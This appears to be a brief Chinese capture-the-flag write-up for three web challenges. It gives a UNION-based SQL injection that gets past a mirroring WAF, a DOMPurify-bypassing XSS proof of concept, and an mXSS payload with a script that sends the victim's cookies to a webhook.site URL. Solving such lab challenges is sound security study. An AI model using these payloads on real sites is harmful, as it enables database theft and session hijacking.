# web

### blackmirror

#sql 

waf为镜像字符串,并替换--和#
```
?query=abcd
变成abcddcba
```

我的思路
```
+-镜像后变为+--+，即可注释字符串
```

```
A") union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()+-
```

---
官方题解
使用mysql special comment
```mysql
/*! <sql语句> */ 
```
这里的语句可以正常执行
`select /*!database()*/;`

payload

`%A") /*! <sql> */ +`

### mint
#xss

dompurify.sanitize(p)

poc
```html
<noscript><style>/*</noscript><img%20src%20onerror=alert(1)>*/
```

### mintmint
#xss
mxss,混淆svg和html的命名空间

```
<script>

let p = encodeURIComponent(`<svg><a><desc><a><table><a></table><style><![CDATA[</style></svg><a id="AA"></body><!-- ]]></svg><img src=1 onerror=eval(top.name)>-->`)

window.open('http://web/?p='+p,'fetch(`https://webhook.site/e1bf3e52-3e62-4be3-9cf6-04e4e1d651ed?a=`+top.document.cookie)')
</script>
```
# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2025-03-21   03:20